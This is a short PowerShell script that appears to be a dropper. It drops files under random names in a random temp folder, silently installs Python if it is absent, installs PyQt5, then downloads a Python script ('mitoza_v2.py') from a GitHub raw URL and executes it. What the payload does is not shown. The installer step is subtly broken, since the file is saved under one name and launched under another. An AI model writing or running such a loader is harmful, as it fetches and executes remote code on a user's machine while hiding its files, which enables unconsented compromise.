$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$dirq=($pth | Measure-Object -Line).Lines
if ($dirq -eq 0) {
    $direc = $env:tmp
}
elseif ($dirq -eq 1) {
    $direc = "$env:tmp\$pth"
}
else {
    $irec=($pth[(Get-Random -Minimum 0 -Maximum $dirq)])
    $direc = "$env:tmp\$irec"    
}

function Get-Random-String {
    param (
        [int]$length = 32
    )
    Write-Output ((-join (((1..9)+(11..33)+(35..57)+59+61+(64..91)+(93..123)+(125..126)) * 20 | Get-Random -Count $length | ForEach-Object {[char]$_}))|Sort-Object {Get-Random})
}

$pname = Get-Random-String
$mname = Get-Random-String
try {
    $a=python -V|Out-String
    write-host $a
    if ([bool](($a) -like "Nie mo") -or (($a) -like "")) {
        throw
    }
    python -m pip install PyQt5
}
catch {
    Invoke-WebRequest https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$direc\$pname"
    Start-Process "$direc\python-3.12.8-amd64.exe" "/quiet","PrependPath=1"
    $err = 1
    while ($err -eq 1) {
        try {
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            $a = python -m pip install pyqt5|Out-String
            if ([bool](($a) -like "Nie mo") -or (($a) -like "")) {
                throw
            }
            $err = 0
        }
        catch {
            Start-Sleep -Seconds 2
            $err=1
        }
    }
}
#finally {
#    if ([bool]((python -m pip list) -like #"*PyQt5*") -eq "") {
#        python -m pip install PyQt5
#    }
#}

Invoke-WebRequest https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py -outfile "$direc\$mname"
python "$direc\$mname"
Start-Process "$direc\$mname"
Start-Sleep -Seconds 30